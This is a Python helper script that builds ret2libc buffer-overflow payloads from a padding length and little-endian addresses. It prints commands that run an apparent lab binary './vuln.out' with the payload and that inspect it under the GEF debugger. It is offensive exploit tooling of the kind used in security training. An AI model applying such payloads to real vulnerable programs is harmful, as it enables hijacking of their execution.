#!/usr/bin/env python3
"""Build a ret2libc payload.

Usage: build_payload.py <padding_len> <arg> [<arg> ...]

Each <arg> after the padding length is either:
  - a hex address, e.g. 0xf7dc8ce0  -> packed as 4 little-endian bytes
  - plain text, e.g. BBBB          -> appended as raw ASCII bytes
"""
import sys


def to_le_bytes(addr_str: str) -> bytes:
    addr = int(addr_str, 16)
    return addr.to_bytes(4, byteorder="little")


def is_hex_arg(arg: str) -> bool:
    return arg.lower().startswith("0x")


def encode_arg(arg: str) -> bytes:
    if is_hex_arg(arg):
        return to_le_bytes(arg)
    return arg.encode()


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)

    try:
        offset = int(sys.argv[1])
    except ValueError:
        print(f"Invalid padding length: {sys.argv[1]!r}")
        print(__doc__)
        sys.exit(1)

    args = sys.argv[2:]

    payload = b"A" * offset
    for arg in args:
        payload += encode_arg(arg)

    print(f"Offset (padding bytes): {offset}")
    print(f"Total payload length:   {len(payload)} bytes")
    print()
    print("Run this to start:")
    print()
    payload_expression = f"b'A'*{offset} + {payload[offset:]!r}"
    print("python3 -c \"import subprocess; subprocess.run(['./vuln.out', "
            f"{payload_expression}])\"")
    print()
    print("Run this at the GEF prompt to inspect the payload:")
    gdb_command = (
        "run $(python3 -c 'import sys; "
        f'sys.stdout.buffer.write(b"A"*{offset} + '
        f'bytes.fromhex("{payload[offset:].hex()}"))'
        "')"
    )
    print(gdb_command)


if __name__ == "__main__":
    main()
